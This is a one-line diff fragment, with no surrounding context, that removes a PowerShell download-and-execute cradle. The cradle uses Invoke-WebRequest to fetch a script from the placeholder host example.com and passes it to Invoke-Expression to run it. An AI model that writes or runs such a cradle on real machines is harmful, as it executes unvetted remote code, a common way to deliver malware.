@@ -1,1 +1,0 @@
-iex (iwr 'http://example.com/file.ps1' -UseBasicParsing)
